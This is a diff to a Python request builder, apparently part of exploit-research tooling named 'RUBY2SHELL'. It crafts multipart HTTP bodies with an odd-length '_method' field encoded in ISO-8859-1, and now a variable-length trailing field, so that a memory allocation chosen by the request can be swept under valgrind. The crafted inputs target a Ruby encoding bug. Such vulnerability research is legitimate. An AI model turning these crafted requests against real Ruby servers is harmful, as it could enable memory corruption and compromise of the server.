@@ -17,6 +17,8 @@ keys/values; the opt-in form-charset-method is the known `_method` sink.
 W375 adds the other 11 single-byte encodings fixed in the same Ruby commit.
 W376 adds a multipart field AFTER the `_method` part, plus an even-N safe
 control; opt-in response digests make response bytes comparable across arms.
+W377 adds a variable-length post-field (`RUBY2SHELL_W377_POSTLEN`) so the
+wire-chosen allocation following `_method` can be swept under valgrind.
 """
 
 import hashlib
@@ -129,8 +131,19 @@ def build(surface):
                 headers + [(b"Content-Type",
                             b"multipart/form-data; boundary=" + BOUNDARY)],
                 body)
-    if surface in ("method-postfield", "method-postfield-safe"):
-        operand = ODD if surface == "method-postfield" else SAFE
+    if surface in ("method-postfield", "method-postfield-safe",
+                   "method-postfield-size", "method-postfield-size-safe"):
+        if surface.endswith("-safe"):
+            operand = SAFE
+        else:
+            operand = ODD
+        if "size" in surface:
+            postlen = int(os.environ.get("RUBY2SHELL_W377_POSTLEN", "30"))
+            if postlen < 0:
+                raise ValueError("negative W377 post-field length")
+            post = (POST + b"A" * postlen)[:postlen]
+        else:
+            post = POST
         body = (b"--" + BOUNDARY + b"\r\n"
                 b'Content-Disposition: form-data; name="_method"\r\n'
                 b"Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n"
@@ -138,7 +151,7 @@ def build(surface):
                 b"\r\n--" + BOUNDARY + b"\r\n"
                 b'Content-Disposition: form-data; name="after"\r\n'
                 b"Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n"
-                + POST +
+                + post +
                 b"\r\n--" + BOUNDARY + b"--\r\n")
         return (b"POST", PATH,
                 headers + [(b"Content-Type",
